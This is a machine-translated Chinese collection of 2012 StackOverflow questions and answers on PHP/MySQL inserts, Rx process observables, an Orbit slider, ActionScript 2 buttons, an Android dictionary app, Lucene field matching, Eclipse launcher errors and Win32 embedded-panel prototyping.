# StackOverflow 问答 11702000-11702999

# php - SQL 查询未执行

> ID：11702004
> 
> 赞同：0
> 
> 时间：2012-07-28T14:47:04.097
> 
> 标签：php, mysql, sql, insert

我正在尝试用 PHP 制作一个非常基本的评论系统。问题是当我提交表单时，新行没有插入我的 MySQL 表中。这是我的代码（有人可以检查一下有什么问题吗？）：

```
<?php
$act = $_POST['act'];
if($act == 1) {
    $m = $_POST['message'];
    $m = strip_tags($m);
    $message = mysql_real_escape_string($m);
    $name = "Anonymous"; //Static username for demonstration purposes
    $date = "2012-7-28"; //Static date for demonstration purposes

    $con = mysql_connect("localhost","username","password");
    if (!$con){die('Could not connect: ' . mysql_error());}

    mysql_query("INSERT INTO comments (name, message, date) VALUES ('$name', '$message', '$date')");
    mysql_close($con);
}
?>

<form action="comments.php" method="post"> 
    <input type="text" name="message">
    <input type="hidden" name="act" value="1">
    <input type="submit" name="submit" value="Submit">
</form> 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-07-28T14:53:40.133

我认为您的问题在于转义，或者更确切地说是列名的“非转义”。你知道'date'是mySQL中的一个函数名吗？

尝试将所有表名和列名放在反引号中。

```
mysql_query("INSERT INTO `comments` (`name`, `message`, `date`) VALUES ('$name', '$message', '$date')"); 
```

此外，为了进一步参考，发布错误消息永远不会伤害寻找答案。除此之外，我找不到您的查询有什么特别错误的地方。

编辑：呃！我错过了一些明显的东西。请执行 'mysql_select_db('name_of_database'); 在查询之前。否则它将不知道在哪里查找您指定的表。

为了完整起见（正如 Michael Besteck 指出的那样），只有在建立连接之后才需要执行 'mysql_real_escape_string'。

也就是说，因为 'escape_string' 依赖于连接的编码来确定哪些字符需要转义以及如何转义。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-07-28T15:08:39.233

需要先建立数据库连接，因为逃逸功能是在我的mysql中执行的。

```
$con = mysql_connect("localhost","username","password");
$message = mysql_real_escape_string($m); 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-07-28T14:57:36.833

使用此代码运行脚本并发布 mysql_error

```
<?php
$act = $_POST['act'];
if($act == 1) {
$m = $_POST['message'];
$m = strip_tags($m);
$message = mysql_real_escape_string($m);
$name = "Anonymous"; //Static username for demonstration purposes
$date = "2012-7-28"; //Static date for demonstration purposes

$con = mysql_connect("localhost","username","password");
if (!$con){die('Could not connect: ' . mysql_error());}

mysql_query("INSERT INTO comments (name, message, date) VALUES ('$name', '$message', '$date')") or die(mysql_error());
mysql_close($con);
}
?>

<form action="comments.php" method="post"> 
<input type="text" name="message">
<input type="hidden" name="act" value="1">
<input type="submit" name="submit" value="Submit">
</form> 
```

UODATE> 工作代码如下：

```
<?php
$act = $_POST['act'];
if($act == 1) {
$m = $_POST['message'];
$m = strip_tags($m);
$message = mysql_real_escape_string($m);
$name = "Anonymous"; //Static username for demonstration purposes
$date = "2012-7-28"; //Static date for demonstration purposes

$con = mysql_connect("localhost","username","password");
mysql_select_db('databasename');
if (!$con){die('Could not connect: ' . mysql_error());}
mysql_query("INSERT INTO comments (name, message, date) VALUES ('$name', '$message', '$date')") or die(mysql_error());
 mysql_close($con);
}
?>

<form action="comments.php" method="post"> 
<input type="text" name="message">
<input type="hidden" name="act" value="1">
<input type="submit" name="submit" value="Submit">
</form> 
```

# c#-4.0 - 创建 IConnectableObservable 来自进程 - 输出缓冲区问题

> ID：11702012
> 
> 赞同：1
> 
> 时间：2012-07-28T14:47:55.080
> 
> 标签：c#-4.0, system.reactive, reactive-programming

下面是我尝试将 System.Diagnostics.Process 转换为 IConnectableObservable。这个解决方案有一个问题：我想连续收听标准输出和错误，并使用事件 Process.Exited 作为 OnCompleted 的触发器。不幸的是，我发现 Process.Exited在输出缓冲区为空**之前引发。**这意味着如果没有我使用线程睡眠的丑陋解决方法，我可以重现不通过 OnNext 语句提供输出的情况。

Q1：您看到此问题的任何解决方法吗？

Q2：关于 System.Reactive：在我的解决方案中我可以做得更好吗？

问候，

马库斯

```
public static class RxProcessUtilities
{
    /// <summary>
    /// Creates a connectable observable for a process.
    /// </summary>
    /// <remarks>Must be a connectable observable in order to hinder multiple 
    /// subscriptions to call the process multiple times.</remarks>
    /// <param name="process">The process.</param>
    /// <returns></returns>
    public static IConnectableObservable<string> CreateConnectableObservableProcess
        (string filename, string arguments, IObservable<string> input = null)
    {
        var observable = Observable.Using(() =>
            {
                Process process = new Process();

                // process configuration
                process.StartInfo.FileName = filename;
                process.StartInfo.Arguments = arguments;
                process.StartInfo.CreateNoWindow = true;
                process.StartInfo.UseShellExecute = false;

                process.EnableRaisingEvents = true;
                process.StartInfo.RedirectStandardError = true;
                process.StartInfo.RedirectStandardOutput = true;

                if (null != input)
                {
                    process.StartInfo.RedirectStandardInput = true;

                    input.Subscribe(s =>
                        {
                            if (!process.HasExited)
                            {
                                process.StandardInput.Write(s);
                            }
                        });
                }

                return process;
            },
            process =>
            {
                return Observable.Create<string>(
                (IObserver<string> observer) =>
                {
                    // listen to stdout and stderr
                    var stdOut = RxProcessUtilities.CreateStandardOutputObservable(process);
                    var stdErr = RxProcessUtilities.CreateStandardErrorObservable(process);

                    var stdOutSubscription = stdOut.Subscribe(observer);
                    var stdErrSubscription = stdErr.Subscribe(observer);

                    var processExited = Observable.FromEventPattern
                    (h => process.Exited += h, h => process.Exited -= h);

                    var processError = processExited.Subscribe(args =>
                    {
                        // Here is my problem: process sends exited event *before* all 
                        // *DataReceived events have been raised

                        // My ugly workaround for process exit before stdout and stderr buffers are empty.
                        Thread.Sleep(2000);

                        // Also: AFAICS we cannot read synchronously what is left in the buffer, 
                        // since we started asynchronously. This will throw:
                        // string restOfStdOut = process.StandardOutput.ReadToEnd();
                        // string restOfStdErr = process.StandardError.ReadToEnd();

                        if (process.ExitCode != 0)
                        {
                            observer.OnError(new Exception
                                (String.Format("Process '{0}' terminated with error code {1}",
                                 process.StartInfo.FileName, process.ExitCode)));
                        }
                        else
                        {
                            observer.OnCompleted();
                        }
                    });

                    process.Start();

                    process.BeginOutputReadLine();
                    process.BeginErrorReadLine();

                    return new CompositeDisposable
                        (stdOutSubscription,
                         stdErrSubscription,
                         processError);
                });
            });

        return observable.Publish();
    }

    /// <summary>
    /// Creates an IObservable&lt;string&gt; for the standard error of a process.
    /// </summary>
    /// <param name="process">The process.</param>
    /// <returns></returns>
    public static IObservable<string> CreateStandardErrorObservable(Process process)
    {
        // var processExited = Observable.FromEventPattern
        //    (h => process.Exited += h, h => process.Exited -= h);

        var receivedStdErr =
            Observable.FromEventPattern<DataReceivedEventHandler, DataReceivedEventArgs>
                (h => process.ErrorDataReceived += h,
                 h => process.ErrorDataReceived -= h)
            //.TakeUntil(processExited) 
            // cannot be used here, since process exited event might be raised 
            // before all stderr and stdout events occurred.
            .Select(e => e.EventArgs.Data);

        return Observable.Create<string>(observer =>
        {
            var cancel = Disposable.Create(process.CancelErrorRead);

            return new CompositeDisposable(cancel, receivedStdErr.Subscribe(observer));
        });
    }

    /// <summary>
    /// Creates an IObservable&lt;string&gt; for the standard output of a process.
    /// </summary>
    /// <param name="process">The process.</param>
    /// <returns></returns>
    public static IObservable<string> CreateStandardOutputObservable(Process process)
    {
        var receivedStdOut =
            Observable.FromEventPattern<DataReceivedEventHandler, DataReceivedEventArgs>
            (h => process.OutputDataReceived += h,
             h => process.OutputDataReceived -= h)
            .Select(e => e.EventArgs.Data);

        return Observable.Create<string>(observer =>
        {
            var cancel = Disposable.Create(process.CancelOutputRead);

            return new CompositeDisposable(cancel, receivedStdOut.Subscribe(observer));
        });
    }
} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-14T12:03:24.607

诀窍是

```
process.WaitForExit(); 
```

请参阅[http://msdn.microsoft.com/en-us/library/fb4aw7b8.aspx](http://msdn.microsoft.com/en-us/library/fb4aw7b8.aspx)：“此重载 [WaitForExit()] 确保所有处理都已完成，包括处理重定向标准输出的异步事件。您应该当标准输出被重定向到异步事件处理程序时，在调用 WaitForExit(Int32) 重载后使用此重载。"

这是完整的解决方案：

```
 /// <summary>
    /// Creates a connectable observable for a process.
    /// </summary>
    /// <remarks>Must be a connectable observable in order to hinder multiple subscriptions to call the process multiple times.</remarks>
    /// <param name="process">The process.</param>
    /// <returns></returns>
    public static IConnectableObservable<string> CreateConnectableObservableProcess(string filename, string arguments, IObservable<string> input = null)
    {
        var observable = Observable.Using(() =>
            {
                Process process = new Process();

                // process configuration
                process.StartInfo.FileName = filename;
                process.StartInfo.Arguments = arguments;
                process.StartInfo.CreateNoWindow = true;
                process.StartInfo.UseShellExecute = false;

                process.EnableRaisingEvents = true;
                process.StartInfo.RedirectStandardError = true;
                process.StartInfo.RedirectStandardOutput = true;

                if (null != input)
                {
                    process.StartInfo.RedirectStandardInput = true;

                    input.Subscribe(s =>
                        {
                            if (!process.HasExited)
                            {
                                process.StandardInput.Write(s);
                            }
                        });
                }

                return process;
            },
            process =>
            {
                return Observable.Create<string>(
                    (IObserver<string> observer) =>
                    {
                        // listen to stdout and stderr
                        var stdOut = RxProcessUtilities.CreateStandardOutputObservable(process);
                        var stdErr = RxProcessUtilities.CreateStandardErrorObservable(process);

                        var stdOutSubscription = stdOut.Subscribe(observer);
                        var stdErrSubscription = stdErr.Subscribe(observer);

                        var processExited = Observable.FromEventPattern(h => process.Exited += h, h => process.Exited -= h);

                        var processError = processExited.Subscribe(args =>
                        {
                            process.WaitForExit();

                            try
                            {
                                if (process.ExitCode != 0)
                                {
                                    observer.OnError(new Exception(String.Format("Process '{0}' terminated with error code {1}",
                                        process.StartInfo.FileName, process.ExitCode)));
                                }
                                else
                                {
                                    observer.OnCompleted();
                                }
                            }
                            finally
                            {
                                process.Close();
                            }
                        });

                        process.Start();

                        process.BeginOutputReadLine();
                        process.BeginErrorReadLine();

                        return new CompositeDisposable(stdOutSubscription,
                                                       stdErrSubscription,
                                                       processError);
                    });
            });

        return observable.Publish();
    } 
```

# jquery - 轨道滑块宽度

> ID：11702021
> 
> 赞同：3
> 
> 时间：2012-07-28T14:48:50.273
> 
> 标签：jquery, css, slider, width, orbit

我似乎无法调整轨道滑块的宽度

[http://ashwinvasudevan.co.cc](http://ashwinvasudevan.co.cc)

根据文档，必须在#featured id 中更改宽度和高度。当我改变它时，图像的大小会改变，而不是整个滑块本身。

[http://postimage.org/image/c0wzaoq4x/](http://postimage.org/image/c0wzaoq4x/)

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-07-28T14:56:41.697

***为我工作：***

```
/* Change CSS */

    div.orbit-wrapper {
      width: 470px !important;
      height: 255px !important;
      position: relative;
    }

/* Or Change JavaScript */

    $(window).load(function() {
      $('#featured').orbit({
        bullets: true
      });

      $('.orbit-wrapper').css({ width: 470, height: 225 });
    }); 
```

# flash - onclick flash 播放不同的帧

> ID：11702023
> 
> 赞同：1
> 
> 时间：2012-07-28T14:49:02.247
> 
> 标签：flash, actionscript-2

我在一个框架中有 2 个符号：鹿和人。我想在第 45 帧停止 flash 电影，如果用户单击鹿播放第 50-100 帧，但如果用户单击人，我想播放第 200-250 帧。我在第 45 帧中的代码是：

```
stop();
var _buttons:Array = [deer, man];

for(var i = 0; i < _buttons.length; i++){
    _buttons[i].onRelease = function() {
        gotoAndPlay(100);
    }

    _buttons[i].onRelease = function() {
        gotoAndPlay(200);
    }
} 
```

当电影在第 45 帧停止并且我单击一个对象时，没有任何反应，但没有错误。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-07-28T17:22:30.733

如果您使用的是 ActionScript 2，您遇到的问题是与对象范围相关的经典问题。这不是 ActionScript 2 的错误，而是 JavaScript 规范。考虑以下代码段

```
trace(this);  // it displays the movieclip that hosts the button
myButton.onRelease = function() {
    trace(this);  //oops, it is the button, not the host.
} 
```

在不求助于 _root 的情况下解决此问题的一种快速方法是

```
stop();
var _buttons:Array = [deer, man];

trace("deer button: " + deer);
deer.context = this;
deer.onRelease = function() {
    trace("deer button is clicked.");
    deer.context.gotoAndPlay(100);
}

trace("man button: " + deer);
man.onRelease = function() {
    trace("man button is clicked.");
    man.context.gotoAndPlay(200);
} 
```

更优雅的实现是使用[delegate](http://www.actionscript.org/resources/articles/205/1/The-Delegate-Class/Page1.html)，因此您不必对 _root 或“context”属性进行硬编码。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-07-28T17:09:47.777

现在您可以从第一个关键帧（“开始”，关键帧 0）开始在操作面板中写入：

```
stop(); // you have write it in the first step

// klick on your deer button and name it "deer_btn", if isn't it
deer_btn.onRelease = function() {
    _root.gotoAndPlay("play_deer");
    trace("I pressed deer_btn"); // can you delete later
}

// klick on your man button and name it "man_btn", if isn't it
man_btn.onRelease = function() {
    _root.gotoAndPlay("play_man");
    trace("I pressed man_btn"); // can you delete later
} 
```

这应该可行，但未经测试。笔记本上没有 Flash。我希望它对你有帮助。可能不会 - 问我。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-07-28T16:10:24.270

尝试：

```
deer.onRelease = function() {
   this.gotoAndPlay(50);
   // make sure that is an stop(); Action on frame 100
}

man.onRelease = function() {
   this.gotoAndPlay(200);
   // make sure that is an stop(); Action on frame 250
} 
```

您如何命名敏感的 Moviclip 或 Button -“鹿”和“人”？最好使用命名帧而不是帧号。转到关键帧并重命名关键帧。然后你可以写例如： this.gotoAndPlay("man_start");

您将其标记为 AS2 - 我希望我能帮助您。此致

编辑：确保您有正确的 gotoAndPlay 路径。当按钮/剪辑在根时间线上时，您可以编写例如 _root.gotoAndPlay("man_start") 。如果按钮在 man 剪辑中，您可以编写例如：

```
deer.your_named_button.onRelease = function() {
    this._parent.gotoAndPlay("man_start");
} 
```

# java - 如何嵌入 Internet 请求代码并获得在一个 OnClickListener 中实现的结果

> ID：11702031
> 
> 赞同：1
> 
> 时间：2012-07-28T14:50:01.840
> 
> 标签：java, android, exception-handling

我正在创建一个在线词典 Android 应用程序。我正在使用 JSON 来请求用户输入的单词的定义。每次单击搜索按钮时，此输入都会输入到变量“文本”中。然后将输入的单词附加到返回定义的 API 请求 URL 中......它存储在底部方法 OnPost Execute() 的变量“结果”中，然后我的 TextView 应该设置为此字符串。

因此，我将整个 JSON 和 HTTPrequest 代码放在 onClickLIstener 中，因为用户输入总是在每次都更改和请求，但是在“public JSONObject lastTweet（String word）”之后的“throws ClientProtocolException”处出现错误，错误是“语法错误在令牌上，删除这些令牌”我正在使用 Enclipse Indigo。

这是我的代码：

```
 public class Dictionary extends Activity {
    String finalresult;
    HttpClient client = new DefaultHttpClient();
    TextView ansa;
    JSONObject json;
    Button Search;
    EditText input; 
    String text;
    final static String URL = "http://api.wordnik.com/v4/word.json/";        
    final static String URL2 = "/definitions?api_key=<MY API KEY>"; 
    String fresult;
    Dictionary dic = new Dictionary();

    protected void onCreate(Bundle savedInstanceState) {
        // TODO Auto-generated method stub
        super.onCreate(savedInstanceState);
        setContentView(R.layout.dictionary);
        ansa = (TextView) findViewById(R.id.ansa);
        input = (EditText) findViewById(R.id.input);
        Search = (Button) findViewById(R.id.search);

     Search.setOnClickListener(new View.OnClickListener() {

            public void onClick(View v) {
                // TODO Auto-generated method stub
                text = input.getText().toString();

                public JSONObject lastTweet(String word) 
                        throws ClientProtocolException, IOException, JSONException{

                    new Read().execute("text");   
                    StringBuffer strBuff = new StringBuffer();
                     strBuff.append(URL);
                     strBuff.append(word);
                     strBuff.append(URL2);

                    HttpGet get = new HttpGet(strBuff.toString());
                    HttpResponse r = client.execute(get);
                    int status = r.getStatusLine().getStatusCode();
                    if (status == 200){
                        HttpEntity e = r.getEntity();
                        String data = EntityUtils.toString(e);
                        JSONArray timeline = new JSONArray(data);
                        JSONObject last = timeline.getJSONObject(0);
                        return last;

                    }else{
                        Toast.makeText(Dictionary.this, "error", Toast.LENGTH_LONG);
                        return null;

                    }

                }

                class Read extends AsyncTask<String, Integer, String>{

                    @Override
                    public String doInBackground(String... params) {
                        // TODO Auto-generated method stub
                        try {
                            json = lastTweet(text);
                            return json.getString(params[0]);
                        } catch (ClientProtocolException e) {
                            // TODO Auto-generated catch block
                            e.printStackTrace();
                        } catch (IOException e) {
                            // TODO Auto-generated catch block
                            e.printStackTrace();
                        } catch (JSONException e) {
                            // TODO Auto-generated catch block
                            e.printStackTrace();
                        }
                        return null;
                    }

                    @Override
                    protected void onPostExecute(String result) {
                        fresult = result;
                        // TODO Auto-generated method stub
                                    }
                }
                    ansa.setText(fresult);
                }

        });

     }  

    public JSONObject lastTweet(String word) 
            throws ClientProtocolException, IOException, JSONException{

        new Read().execute("text");   
        StringBuffer strBuff = new StringBuffer();
         strBuff.append(URL);
         strBuff.append(word);
         strBuff.append(URL2);

        HttpGet get = new HttpGet(strBuff.toString());
        HttpResponse r = client.execute(get);
        int status = r.getStatusLine().getStatusCode();
        if (status == 200){
            HttpEntity e = r.getEntity();
            String data = EntityUtils.toString(e);
            JSONArray timeline = new JSONArray(data);
            JSONObject last = timeline.getJSONObject(0);
            return last;

        }else{
            Toast.makeText(Dictionary.this, "error", Toast.LENGTH_LONG);
            return null;

        }

    }

    class Read extends AsyncTask<String, Integer, String>{

        @Override
        public String doInBackground(String... params) {
            // TODO Auto-generated method stub
            try {
                json = lastTweet(text);
                return json.getString(params[0]);
            } catch (ClientProtocolException e) {
                // TODO Auto-generated catch block
                e.printStackTrace();
            } catch (IOException e) {
                // TODO Auto-generated catch block
                e.printStackTrace();
            } catch (JSONException e) {
                // TODO Auto-generated catch block
                e.printStackTrace();
            }
            return null;
        }

        @Override
        protected void onPostExecute(String result) {
            fresult = result;
            // TODO Auto-generated method stub
        }
    }

} 
```

有什么建议么？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-28T14:52:16.783

您是否尝试将请求代码移动到另一个类？

# java - 使用 OpenCV 代码为 Android 开发应用程序

> ID：11702032
> 
> 赞同：1
> 
> 时间：2012-07-28T14:50:03.713
> 
> 标签：java, android, opencv, android-ndk

我是 opencv for android 的新手。我知道 C/C++，但不知道如何用 Java 编程。我使用 OpenCV 开发了 C/C++ 代码。现在我想将此代码移植到 Android 操作系统。请告诉我一些教程或给我一些说明，我可以轻松地移植该代码。

提前致谢。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-28T14:52:52.847

Android 可以将 c++ 作为代码的一部分运行。检查安卓NDK

# lucene - 基于 Lucene 的搜索

> ID：11702038
> 
> 赞同：1
> 
> 时间：2012-07-28T14:50:58.517
> 
> 标签：lucene

我在基于 Lucene 的搜索中遇到问题。我设计了一个包含五个字段的文档。考虑该文档是带有 addressline1、addressline2、city、state 和 pin 的 Address。如果要执行搜索，则搜索已在所有字段中完成，因此我使用的是布尔术语查询。因此将检索结果。现在，我不仅要响应响应，还要响应匹配字段。例如，如果城市字段与搜索匹配，那么我应该响应城市匹配搜索以及实际搜索响应。是否有任何 lucene api 来适应这个？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-07-29T00:24:16.083

AFAIK 没有简单的解决方案来找出与查询匹配的字段。

您的选择是：

1.  尝试使用命中荧光笔（它知道匹配发生的位置，但在大型结果集上明显变慢）
2.  摆弄 IndexSearcher 的解释方法
3.  构建您的定制解决方案

[点击荧光笔体验和解决方法发现。](http://mail-archives.apache.org/mod_mbox/lucene-java-user/201207.mbox/%3CCABEREKHNn1wKFo2rYNq+Zi4JK0D57FG-RrMF29qupzOdy_6ykw@mail.gmail.com%3E)

恕我直言，自己实现这一点应该不难，因为 Lucene 在某个时间点肯定知道哪个字段产生了匹配项，但是在组成您的响应时，它会将该信息作为不必要的权重丢弃。
我偶然发现了[这种自定义方法](http://mail-archives.apache.org/mod_mbox/lucene-solr-user/201005.mbox/%3C901394.60057.qm@web81101.mail.mud.yahoo.com%3E)。

[尝试在最好的 Lucene/Solr 相关搜索引擎 search-lucene.com 上查找更多资源。](http://search-lucene.com/?page=0&q=which%20field%20has%20a%20match&fc_project=Lucene)

# eclipse - 在桌面上运行 Eclipse = 找不到配套库

> ID：11702039
> 
> 赞同：0
> 
> 时间：2012-07-28T14:51:06.060
> 
> 标签：eclipse

我刚刚将 Eclipse Juno 下载到我的机器上。我将文件解压缩到“C:\Program Files”中的 Eclipse 子目录中。当我尝试从这里启动 eclipse 时，效果很好！但是我不想每次我想启动 Eclipse 时都必须导航到这个目录。我尝试将可执行文件移动到我的桌面，但是当我尝试运行它时，我收到以下消息：

eclipse 可执行启动器无法找到它的配套库。

如果我不打算将它们放在同一个文件夹中，如何让 eclipse 知道它的配套库在哪里？请非常具体。

谢谢！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-28T15:14:52.477

您不要将可执行文件移动到桌面，因为可执行文件需要与它所在的其他文件位于同一目录中。取回它，然后创建快捷方式或链接。您可以自由创建所需的快捷方式或链接。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-11-24T13:36:59.853

好吧，我曾经有过同样的问题，我发现因为我改变了 elcipse.exe 的位置，它对“eclipse.ini”文件有一些影响

1.启动路径

D:\ <elcipse 文件夹> elcipse:\ **plugins\org.eclipse.equinox.launcher_1.3.0.v20120522-1813.jar** \这是启动jar文件。

2.共享lucher库的路径

D:\ <elcipse文件夹> elcipse:\ **org.eclipse.equinox.launcher.win32.win32.x86_1.1.200.v20120522-1813** \这是共享启动器库jar文件。

只需设置以下两条路径，ti 将像以前一样重新启动.. 快乐编码..

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2017-12-11T10:56:57.393

日食霓虹灯，2017：

*   我复制了`.p2`在家里找到的旧文件夹。
*   再次运行日食，它起作用了。

过去，您可以将 eclipse 复制为 zip 文件就可以正常工作，但现在似乎有些插件依赖于该`.p2`文件夹。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2017-05-21T23:26:40.833

这是针对 Windows 和 Mac 的 Eclipse 提交的错误：

尝试启动 Eclipse（双击 Eclipse.app）时，启动失败。唯一的操作是一个带有此消息的对话框：'eclipse 可执行启动器无法找到其伴随的共享库'。我在这里找到了问题的在线描述和解决方法：

具体来说，按照上面的说明：

*   我打开了位于 eclipse.ini 的 Eclipse.app 包，对其进行了编辑
*   在插件文件夹中搜索匹配 org.eclipse.equinox.launcher.carbon 的内容。
*   复制了加工文件夹名称（来自插件）
*   将其粘贴为 --launcher.library 路径的终止部分
*   用该路径替换了 --launcher.library 行

[https://bugs.eclipse.org/bugs/show_bug.cgi?id=288112](https://bugs.eclipse.org/bugs/show_bug.cgi?id=288112)

# visual-studio - 在 Windows 上对嵌入式软件进行原型设计和仿真

> ID：11702040
> 
> 赞同：9
> 
> 时间：2012-07-28T14:51:17.503
> 
> 标签：visual-studio, embedded, visual-studio-express, rtos, prototyping

我正在寻找用于原型设计（虚拟原型设计）、模拟和测试桌面 Windows 上深度嵌入式 C 代码的工具和技术，包括构建由按钮、LED 和 LCD 显示器（分段和图形）组成的逼真的嵌入式前面板。

我对使用纯 C 代码和原始 Win32 API 而不是 MFC、.NET/C#、vxWidgets 或 Qt 的可能低级方法特别感兴趣。我还想使用免费的开发工具，例如带有 Platform SDK 和 ResEdit 的 Visual C++ Express 来编辑资源。

我正在寻找代码示例来渲染图形 LCD（从单色到 24 位颜色），具有高效的像素级界面、多段 LCD 和响应“按下”和“释放”事件的自绘按钮。

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-08-28T19:54:43.483

我很惊讶我最初的问题引发了如此多的误解和负面评论。在一台机器（例如 PC）上开发深度嵌入的 C 代码并在另一台机器（嵌入式微控制器）上运行它的策略称为“双重目标”，并且非常普遍。例如，在 PC 上开发和测试深度嵌入的代码是 James Grenning 最近出版的《嵌入式 C 的测试驱动开发》一书的基石。

**通过双目标避免目标硬件瓶颈**

请注意，双重定位并不意味着嵌入式设备与 PC 有任何关系。这也不意味着模拟必须与嵌入式目标 CPU 的周期精确。

双重目标仅仅意味着从第一天开始，您的嵌入式代码（通常在 C 中）被设计为在至少两个平台上运行：最终目标硬件和您的 PC。为此，您真正需要的是两个 C 编译器：一个用于 PC，另一个用于嵌入式设备。

然而，双重目标策略确实需要一种特定的嵌入式软件设计方式，以便通过定义明确的接口处理任何目标硬件依赖关系，该接口通常称为板支持包 (BSP)。该接口至少有两种实现方式：一种用于实际目标，另一种用于 PC，例如运行 Windows。有了这样的接口，大部分嵌入式代码可以完全不知道它链接到哪个 BSP 实现，因此可以在 PC 上快速开发，但也可以在目标硬件上运行*而无需任何更改*。

虽然一些嵌入式程序员可以将双重目标视为自己造成的负担，但更有经验的开发人员普遍认为，关注软件和硬件之间的界限实际上是有益的，因为它会产生更模块化、更便携和更易于维护的软件更长的使用寿命。对双重目标的投资还可以在大大加快的编译-运行-调试周期中立即获得回报，与运行代码的可见性有限且速度较慢、资源受限的深度嵌入式目标相比，在功能强大的 PC 上更快、更高效.

**前面板 Win32 GUI 工具包**

在为具有非平凡用户界面的设备开发嵌入式代码时，经常会遇到将嵌入式前面板表示为 PC 上的 GUI 元素的问题。这个问题是如此普遍，以至于我真的很惊讶这里没有人可以推荐一个现有的库或一个开源项目，它们将为基本元素（如 LCD、按钮和 LED）提供一个简单的纯 C 接口。这实际上并没有那么复杂，但似乎每个嵌入式开发人员都必须一遍又一遍地重新发明这个轮子。

因此，为了帮助有兴趣在 Windows 上对嵌入式设备进行原型设计的嵌入式开发人员，我创建了一个“前面板 Win32 GUI 工具包”并在 GPL 开源许可下在线发布（参见[http://www.state-machine.com/赢32](http://www.state-machine.com/win32)）。该工具包仅依赖于 C 语言中的原始 Win32 API，目前提供以下元素：

1.  点阵显示器，用于高效的像素可寻址显示器，例如图形 LCD、OLED 等，颜色高达 24 位

2.  用于分段显示的分段显示器，例如分段 LCD，以及带有用于分段的通用自定义位图的分段 LED。

3.  具有自定义“按下”和“释放”位图的所有者绘制的按钮，并且能够在按下和释放时生成单独的事件。

该工具包附带一个示例和一个应用说明（参见[http://www.state-machine.com/win32/AN_Win32-GUI.pdf](http://www.state-machine.com/win32/AN_Win32-GUI.pdf)），展示了如何处理来自所有者绘制的按钮、常规按钮、键盘的输入，和鼠标。[您还可以在http://www.state-machine.com/win32/front_panel.html](http://www.state-machine.com/win32/front_panel.html)上查看动画演示。

关于“前面板 Win32 GUI 工具包”的大小和复杂性，上述 GUI 元素的实现只需要大约 250 行 C 语言。所有输入源和大量注释的示例总计大约 300 行 C 语言。该工具包已使用免费的 Visual C++ Express 2010（带有 Express Edition Platform SDK）和免费的 ResEdit 资源编辑器进行了测试。

享受！

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-19T17:30:14.403

您在对问题的评论说明中提到的设备永远不会使用 Windows PC，因此在这种情况下不需要低级 Windows 编程。事实上，我会说它不受欢迎。原型设计与速度有关。这是关于你能以多快的速度把一些东西放在一起向潜在的投资者或高层管理人员或其他决策者展示。

您不希望在低级 C 和 Win32 api 上花费额外的时间，直到项目需求被清除到足以让您知道这是最终项目可交付成果的绝对要求（*也许是服务器/PC 监控工具？*）。在此之前，您需要开发速度。幸运的是，该行业拥有用于快速原型设计和硬件开发的工具，如您所描述的。

## 我对嵌入式开发原型的偏好

至于我作为开发人员的意见，我喜欢 .net 微框架 (.netmf) 仅仅是因为我已经是 Microsoft .Net 开发人员并且可以转移我现有的很多技能。因此，我在 Visual C# Express 2010 下使用 C# 使用 FEZ 微控制器进行原型制作（根据需要免费）。它快速、简单，您可以在几分钟内完成项目的核心。

如果您作为开发人员的经验不同，您可能会寻找使用 BASIC、Java 或其他语言编程的微控制器，以通过重用您的核心技能集来帮助加快开发速度。

## 解决您的问题赏金评论

> 惊人的大部分嵌入式软件可以在台式计算机上开发，而不是在深度嵌入式目标上。如果处理得当，这种“目标系统瓶颈”的避免可以潜在地将生产力提高一个数量级。但是，要在桌面上开发嵌入式软件，需要模拟 UI 组件，例如显示器（分段和越来越图形化）、LED、旋钮和按钮。我正在寻找用 C 语言用普通 Win32 API 编写的此类 UI 组件，以便与要在桌面 Windows 上开发和测试的嵌入式代码轻松集成。

我从事嵌入式开发的专业工作超过 4 年，以及围绕该兼职工作的许多年。虽然您上面所说的有些正确，但它不会为您节省时间或金钱，这就是为什么每个人都对这种策略的动机感到困惑的原因。我们花了数年时间试图为这家公司的硬件设备推出一个 Windows 模拟器，理论上这可以节省原型设计的时间。这总是很痛苦，我们花了更多的时间来模拟这种体验，而不是直接从草绘的 UI 绘图规范到真正的开发。仿真器落后于硬件开发，通常要等到硬件发布 6 个月或更长时间后才能支持最新功能。这是很多额外的工作，但价值很小。

您将花费更多时间来开发不可重用的 win32 平台代码和硬件仿真组件，而不是实际为核心项目本身编写代码。这仅对硬件供应商才有意义，他们将此仿真器作为“增值”工具提供给潜在的第 3 方开发人员，但对于新硬件设计的原型制作没有意义。

现代开发环境（如带有 FEZ 微控制器的 Visual C# Express 2010）可以编译、将项目输出推送到微控制器，然后开始调试的速度与在 C 中编译和运行模拟 LCD 或 LED 的低级 Windows 应用程序一样快*或更快*，或者开关等...因此，现代工具不再适用您的评论“将生产力提高一个数量级”。（可能是在过去 10 年左右之前。）

如果您真的，真的只是想在 PC 上直观地模拟嵌入式硬件，请使用 adobe flash 之类的东西来模拟 UI。但是，当您制作原型的最终设备不会运行 windows 时，不要通过为 windows 编码来复制代码（也许会运行 windows，但您没有这么说）。使用当今可用的最快最可靠的原型设计工具，这绝对*不是*低级 C 和 win32 api！

## 也许将 StackExchange 用于电子产品？

